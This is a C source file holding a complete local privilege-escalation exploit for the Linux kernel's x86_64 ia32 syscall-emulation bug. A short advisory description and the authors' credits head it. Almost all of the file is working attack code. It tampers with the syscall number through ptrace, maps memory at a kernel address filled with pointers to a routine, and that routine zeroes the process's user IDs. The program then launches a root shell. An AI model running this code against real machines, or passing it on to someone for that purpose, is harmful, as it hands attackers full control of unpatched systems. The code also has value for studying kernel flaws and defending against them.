/*
source: https://www.securityfocus.com/bid/25774/info

The Linux kernel is prone to a local privilege-escalation vulnerability.

Exploiting this issue may allow local attackers to gain elevated privileges, facilitating the complete compromise of affected computers.

Versions of Linux kernel prior to 2.4.35.3 and 2.6.22.7 are vulnerable to this issue.
*/


/*
 * exploit for x86_64 linux kernel ia32syscall emulation
 * bug, discovered by Wojciech Purczynski <cliph_at_isec.pl>
 *
 * by
 * Robert Swiecki <robert_at_swiecki.net>
 * Przemyslaw Frasunek <venglin_at_freebsd.lublin.pl>
 * Pawel Pisarczyk <pawel_at_immos.com.pl>
 * of ATM-Lab http://www.atm-lab.pl
 */

#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <inttypes.h>
#include <sys/reg.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>

uint32_t uid, euid, suid;

static void kernelmodecode(void)
{
        int i;
        uint8_t *gs;
        uint32_t *ptr;

        asm volatile ("movq %%gs:(0x0), %0" : "=r"(gs));

        for (i = 200; i < 1000; i+=1) {

                ptr = (uint32_t*) (gs + i);

                if ((ptr[0] == uid) && (ptr[1] == euid)
                        && (ptr[2] == suid) && (ptr[3] == uid)) {
                        ptr[0] = 0; //UID
                        ptr[1] = 0; //EUID
                        ptr[2] = 0; //SUID

                        break;
                }
        }

}

static void docall(uint64_t *ptr, uint64_t size)
{
        getresuid(&uid, &euid, &suid);

        uint64_t tmp = ((uint64_t)ptr & ~0x00000000000FFF);

        if (mmap((void*)tmp, size, PROT_READ|PROT_WRITE|PROT_EXEC,
                MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) == MAP_FAILED) {
                printf("mmap fault\n");
                exit(1);
        }

        for (; ptr < (tmp + size); ptr++)
                *ptr = (uint64_t)kernelmodecode;

        __asm__("\n"
        "\tmovq $0x101, %rax\n"
        "\tint $0x80\n");

        printf("UID %d, EUID:%d GID:%d, EGID:%d\n", getuid(), geteuid(), getgid(), getegid());
        execl("/bin/sh", "bin/sh", 0);
        printf("no /bin/sh ??\n");
        exit(0);
}

int main(int argc, char **argv)
{
        int pid, status, set = 0;
        uint64_t rax;
        uint64_t kern_s = 0xffffffff80000000;
        uint64_t kern_e = 0xffffffff84000000;
        uint64_t off = 0x0000000800000101 * 8;

        if (argc == 4) {
                docall((uint64_t*)(kern_s + off), kern_e - kern_s);
                exit(0);
        }

        if ((pid = fork()) == 0) {
                ptrace(PTRACE_TRACEME, 0, 0, 0);
                execl(argv[0], argv[0], "2", "3", "4", 0);
                perror("exec fault");
                exit(1);
        }

        if (pid == -1) {
                printf("fork fault\n");
                exit(1);
        }

        for (;;) {
                if (wait(&status) != pid)
                        continue;

                if (WIFEXITED(status)) {
                        printf("Process finished\n");
                        break;
                }

                if (!WIFSTOPPED(status))
                        continue;

                if (WSTOPSIG(status) != SIGTRAP) {
                        printf("Process received signal: %d\n", WSTOPSIG(status));
                        break;
                }

                rax = ptrace(PTRACE_PEEKUSER, pid, 8*ORIG_RAX, 0);
                if (rax == 0x000000000101) {
                        if (ptrace(PTRACE_POKEUSER, pid, 8*ORIG_RAX, off/8) == -1) {
                                printf("PTRACE_POKEUSER fault\n");
                                exit(1);
                        }
                        set = 1;
                }

                if ((rax == 11) && set) {
                        ptrace(PTRACE_DETACH, pid, 0, 0);
                        for(;;)
                                sleep(10000);
                }

                if (ptrace(PTRACE_SYSCALL, pid, 1, 0) == -1) {
                        printf("PTRACE_SYSCALL fault\n");
                        exit(1);
                }
        }

        return 0;
}